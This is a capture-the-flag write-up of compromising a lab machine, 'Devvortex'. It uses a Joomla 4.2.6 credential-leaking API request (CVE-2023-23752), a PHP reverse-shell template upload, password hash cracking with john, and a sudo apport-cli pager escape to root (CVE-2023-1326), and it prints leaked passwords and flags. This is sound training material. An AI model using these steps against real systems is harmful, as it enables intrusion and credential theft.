
Target : 10.129.229.146

Started off with the port scan : 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Need to add `devvortex.htb` in `/etc/hosts`

`echo "10.129.229.146 devvortex.htb" | sudo tee -a /etc/hosts`

Enumerating Port : 80

Let's enumerate subdomains using ffuf:

`ffuf -w ~/Seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.devvortex.htb" -u http://devvortex.htb/ -mc 200,404`

![](../Screenshot%202026-07-17%20at%207.39.34%20PM.png)

found a subdomain `dev`, lets add it in /etc/hosts

```
/logs/index.html      (Status: 200) [Size: 31]
/modules/mod_custom/mod_custom.xml (Status: 200) [Size: 2147]
/modules/mod_custom/mod_custom.php (Status: 200) [Size: 0]
/modules/mod_feed/mod_feed.xml (Status: 200) [Size: 3758]
/modules/mod_custom/tmpl/default.php (Status: 200) [Size: 0]
/modules/mod_feed/mod_feed.php (Status: 200) [Size: 0]
/modules/mod_feed/tmpl/default.php (Status: 200) [Size: 0]
/modules/mod_menu/mod_menu.xml (Status: 200) [Size: 2976]
/modules/mod_login/mod_login.xml (Status: 200) [Size: 1319]
/modules/mod_login/mod_login.php (Status: 200) [Size: 0]
/modules/mod_menu/mod_menu.php (Status: 200) [Size: 0]
/modules/mod_login/tmpl/default.php (Status: 200) [Size: 0]
/modules/mod_menu/tmpl/default.php (Status: 200) [Size: 0]
/plugins/system/cache/cache.php (Status: 403) [Size: 3653]
/templates/system/component.php (Status: 200) [Size: 0]
/templates/system/error.php (Status: 200) [Size: 0]
/templates/system/index.php (Status: 200) [Size: 0]
```

Joomla - 4.2.6 is running, which is vulnerable to authentication bypass (CVE-2023-23752)

http://dev.devvortex.htb/administrator/manifests/files/joomla.xml

![](../Screenshot%202026-07-17%20at%208.55.17%20PM.png)

Exploit :

`curl "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true"`

![](../Screenshot%202026-07-17%20at%2010.06.13%20PM.png)

`lewis:P4ntherg0t1n5r3c0n##`

Successfully logged into the joomla dashboard, now we can edit the php templates to get reverse shell.

Upon navigating to `System > Site Templates > Cassiopeia Details and Files `, we are able to see the current template contents.

Upload php reverse shell and triggered `http://dev.devvortex.htb/templates/cassiopeia/error.php` to get shell as `www-data`

While reading joomla documentation, i have identified, database credential will be stored there, moved to `cd /var/www/dev.devvortex.htb/` to read `configuration.php`

![](../Screenshot%202026-07-17%20at%2010.40.38%20PM.png)

`P4ntherg0t1n5r3c0n##`

```
mysql> select username,email,password from sd4fg_users
    -> ;
+----------+---------------------+--------------------------------------------------------------+
| username | email               | password                                                     |
+----------+---------------------+--------------------------------------------------------------+
| lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+---------------------+--------------------------------------------------------------+
```

Let's crack the hash of `logan`

`john hash --wordlist=~/SecLists/rockyou.txt`

Got the password: `logan:tequieromucho`

```
logan@devvortex:~$ cat user.txt
9a1e0d0a66988601b2cef31a7be5e3da
```

**Privilege Escalation to Root:**

```
sudo -l

Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

`/usr/bin/apport-cli --version`  reveals `2.20.11` which is vulnerable to local privilege escalation (CVE-2023-1326)

The exploit stems from the fact that apport-cli invokes a pager (such as less ) when viewing a crash, which can be used to run system commands in the context of the user executing the parent command. In this case, if ran with as root using sudo , it can be used to spawn an interactive system shell, as the elevated privileges are not dropped. With that in mind, we need to somehow trigger the pager, so we start by listing all the running processes and can then attempt to report a problem using apport-cli in `--file-bug` mode.

`ps -ux`

![](../Screenshot%202026-07-17%20at%2011.14.06%20PM.png)

We now run `apport-cli` using sudo , specifying the PID using the `-P` flag and file-bug mode using the `-f` flag. The tool will then gather information and report any issues with that process, prompting us to pick what to do with the report. We proceed to select view report , and since less is configured as the default pager, we can run the !/bin/bash command and spawn an interactive system shell as root .

`sudo /usr/bin/apport-cli -f -P 3344`

```
root@devvortex:~# cat root.txt
fa35fff7a51fba6cf4662c17833299a8
```

